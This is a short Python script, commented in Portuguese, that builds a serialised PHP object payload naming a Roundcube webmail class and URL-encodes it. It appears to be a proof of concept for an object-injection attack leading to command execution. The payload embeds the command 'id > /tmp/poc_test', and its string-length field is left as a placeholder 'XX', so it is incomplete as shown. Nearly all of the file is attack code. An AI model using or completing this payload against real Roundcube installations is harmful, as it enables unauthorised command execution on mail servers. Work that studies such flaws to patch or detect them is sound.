import urllib.parse

# Classe real do Roundcube que é desserializada com __destruct()
payload = 'O:27:"rcube_washtml_mailto_handler":1:{s:4:"html";s:XX:"id > /tmp/poc_test";}'

# Codifica o payload para uso na URL
print("[+] Payload codificado:")
print(urllib.parse.quote(payload))
